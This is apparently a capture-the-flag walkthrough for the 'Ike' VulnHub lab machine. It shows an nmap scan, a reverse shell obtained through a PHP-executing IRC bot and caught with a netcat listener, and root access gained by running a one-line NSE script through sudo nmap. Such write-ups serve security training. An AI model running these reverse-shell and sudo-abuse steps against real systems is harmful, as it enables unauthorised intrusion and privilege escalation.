
Ike

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Connecting to IRC channel
[+] Sending reverse shell to PHP bot on channel
[+] Privilege Escalation abusing SUDO rights - /usr/bin/nmap
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Nmap scanning
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.101
Host is up (0.00083s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
6667/tcp open  irc         InspIRCd
| irc-info: 
|   server: irc.ike.local
|   users: 2
|   servers: 1
|   chans: 1
|   lusers: 2
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.56.102
|_  error: Closing link: (nmap@192.168.56.102) [Client exited]
MAC Address: 08:00:27:A2:16:16 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts: IKE, irc.ike.local

Host script results:
|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
|_nbstat: NetBIOS name: IKE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: ike
|   NetBIOS computer name: IKE\x00
|   Domain name: \x00
|   FQDN: ike
|_  System time: 2019-10-04T14:46:02+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-10-04 08:46:02
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.83 ms 192.168.56.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.49 seconds

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


There is an IRC channel
Connecting to it with HexChat we find a bot listening on channel #php. This bot executes commands in php.
system and other commands are restricted
By enetering the following into the chat on channel #php we get a reverse shell
![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/ike/ike.png)

Reverse shell on port 1234

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 59038
id
uid=1001(ike) gid=1001(ike) groups=1001(ike),27(sudo)
python -c 'import pty;pty.spawn("/bin/bash");'
ike@ike:~$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Privilege Escalation
User ike has privileges to run root with sudo -l on /usr/bin/nmap

In ordet to gain root priileges, we have to create a nse script, to run the script and get root.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ike@ike:~$ sudo -l
sudo -l
Matching Defaults entries for ike on ike:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ike may run the following commands on ike:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/nmap
ike@ike:~$ sudo /usr/bin/nmap -V
sudo /usr/bin/nmap -V

Nmap version 7.60 ( https://nmap.org )
Platform: x86_64-pc-linux-gnu
Compiled with: liblua-5.3.3 openssl-1.1.0g nmap-libssh2-1.8.0 libz-1.2.8 libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: epoll poll select
ike@ike:~$ echo "os.execute('/bin/sh')" > /tmp/shell.nse
echo "os.execute('/bin/sh')" > /tmp/shell.nse
ike@ike:~$ sudo nmap --script=/tmp/shell.nse
sudo nmap --script=/tmp/shell.nse

Starting Nmap 7.60 ( https://nmap.org ) at 2019-10-04 15:21 CEST
# id
uid=0(root) gid=0(root) groups=0(root)
# 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
